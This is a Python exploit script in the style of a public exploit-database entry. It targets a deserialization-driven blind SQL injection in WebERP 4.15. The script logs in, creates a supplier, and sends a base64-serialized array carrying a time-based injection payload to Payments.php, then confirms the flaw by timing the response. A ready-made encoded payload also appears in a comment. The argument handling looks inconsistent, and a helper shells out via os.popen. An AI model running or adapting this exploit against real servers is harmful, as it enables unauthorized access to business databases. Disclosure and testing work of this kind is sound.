# Exploit Title: Blind SQL injection in WebERP.
# Date: June 10, 2019
# Exploit Author: Semen Alexandrovich Lyhin (https://www.linkedin.com/in/semenlyhin/)
# Vendor Homepage: http://www.weberp.org/
# Version: 4.15

# A malicious query can be sent in base64 encoding to unserialize() function. It can be deserialized as an array without any sanitization then. 
# After it, each element of the array is passed directly to the SQL query. 

import requests
import base64
import os
import subprocess
from bs4 import BeautifulSoup
import re
import time
import sys

def generatePayload(PaidAmount="0",PaymentId="0"):
    #THIS FUNCTION IS INSECURE BY DESIGN
    ToSerialize = r"[\"%s\" => \"%s\"]" % (PaymentId, PaidAmount)
    return os.popen("php -r \"echo base64_encode(serialize(" + ToSerialize + "));\"").read()

def getCookies(ip, CompanyNameField, usr, pwd, proxies):
    r = requests.get("http://" + ip + "/index.php", proxies=proxies)
    s = BeautifulSoup(r.text, 'lxml')
    m = re.search("FormID.*>", r.text)
    FormID = m.group(0).split("\"")[2]
    
    data = {"FormID":FormID,"CompanyNameField":CompanyNameField,"UserNameEntryField":usr,"Password":pwd,"SubmitUser":"Login"}
    r = requests.post("http://" + ip + "/index.php", data, proxies=proxies)
    
    return {"PHPSESSIDwebERPteam":r.headers["Set-Cookie"][20:46]}
    

def addSupplierID(name, cookies, proxies):
    r = requests.get("http://" + ip + "/Suppliers.php", cookies=cookies)
    s = BeautifulSoup(r.text, 'lxml')
    m = re.search("FormID.*>", r.text)
    FormID = m.group(0).split("\"")[2]
    
    data = {"FormID":FormID,"New":"Yes","SupplierID":name,"SuppName":name,"SupplierType":"1","SupplierSince":"01/06/2019","BankPartics":"","BankRef":"0",
            "PaymentTerms":"20","FactorID":"0","TaxRef":"","CurrCode":"USD","Remittance":"0","TaxGroup":"1","submit":"Insert+New+Supplier"}
            
    requests.post("http://" + ip + "/Suppliers.php", data=data,cookies=cookies,proxies=proxies)


def runExploit(cookies, supplier_id, payload, proxies):
    r = requests.get("http://" + ip + "/Payments.php", cookies=cookies, proxies=proxies)
    s = BeautifulSoup(r.text, 'lxml')
    m = re.search("FormID.*>", r.text)
    FormID = m.group(0).split("\"")[2]
    
    data = {"FormID":FormID,
            "CommitBatch":"2",
            "BankAccount":"1",
            "DatePaid":"01/06/2019",
            "PaidArray":payload}
         
    requests.post("http://" + ip + "/Payments.php?identifier=1559385755&SupplierID=" + supplier_id, data=data,cookies=cookies,proxies=proxies)


if __name__ == "__main__":
    proxies = {'http':'127.0.0.1:8080'}
    #proxies = {}
    
    if len(sys.argv) != 5:
        print '(+) usage: %s <target> <path> <login> <password> <order>' % sys.argv[0]
        print '(+) eg: %s 127.0.0.1 "weberp/webERP/" admin weberp 1' % sys.argv[0]
        print 'Order means the number of company on the website. Can be gathered from the login page and usually equals 0 or 1'
        exit()
    
    ip = sys.argv[1]
    
    #if don't have php, set Payload to the next one to check this time-based SQLi: YToxOntpOjA7czoyMzoiMCB3aGVyZSBzbGVlcCgxKT0xOy0tIC0iO30=
    #payload = generatePayload("0 where sleep(1)=1;-- -", "0")
    
    payload = generatePayload("0", "' or sleep(5) and '1'='1")
    print payload
    
    #get cookies
    cookies = getCookies(ip, sys.argv[4], sys.argv[2], sys.argv[3], proxies)
    
    addSupplierID("GARUMPAGE", cookies, proxies)
    
    t1 = time.time()
    runExploit(cookies, "GARUMPAGE", payload, proxies)
    t2 = time.time()
    
    if (t2-t1>4):
        print "Blind sqli is confirmed"
    else:
        print "Verify input data and try again"